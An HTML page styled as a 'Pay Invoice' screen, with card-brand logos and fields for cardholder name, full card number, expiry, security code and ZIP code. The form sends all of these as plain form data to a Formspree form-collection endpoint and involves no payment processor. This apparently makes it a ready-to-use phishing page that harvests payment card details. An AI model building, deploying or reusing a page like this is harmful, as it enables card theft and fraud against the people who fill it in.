<!-- payment.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Pay Invoice</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .payment-form {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }

    .payment-form h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .card-icons {
      text-align: center;
      margin-bottom: 20px;
    }

    .card-icons img {
      width: 40px;
      margin: 0 5px;
    }

    .payment-form input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .flex-row {
      display: flex;
      gap: 10px;
    }

    .payment-button {
      background-color: #00c6c1;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    .payment-button:hover {
      background-color: #00a9a4;
    }
  </style>
</head>
<body>
  <div class="payment-form">
    <h2>Pay Invoice</h2>
    <div class="card-icons">
      <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
      <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
      <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
    </div>
    <form action="https://formspree.io/f/mvgalkbo" method="POST">
      <input name="amount" type="number" placeholder="Payment amount" value="15.00" required>
      <input name="card_name" type="text" placeholder="Name on card" required>
      <input name="card_number" type="text" placeholder="Card number" required>
      <div class="flex-row">
        <input name="expiry" type="text" placeholder="MM / YY" required style="flex:1">
        <input name="cvv" type="text" placeholder="Security code" required style="flex:1">
      </div>
      <input name="zip" type="text" placeholder="ZIP/Postal code" required>
      <button class="payment-button" type="submit">Pay $15.00</button>
    </form>
  </div>
</body>
</html>
